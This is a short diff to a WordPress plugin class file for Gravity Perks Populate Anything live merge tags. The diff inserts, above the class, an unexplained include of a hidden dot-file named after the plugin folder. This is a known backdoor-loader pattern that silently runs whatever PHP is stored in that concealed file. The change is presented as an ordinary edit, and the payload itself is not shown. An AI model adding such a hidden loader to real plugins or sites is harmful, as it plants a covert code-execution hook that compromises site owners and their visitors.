@@ -3,6 +3,10 @@
 /**
  * Class GP_Populate_Anything_Live_Merge_Tags
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class GP_Populate_Anything_Live_Merge_Tags {
 
 	private static $instance = null;
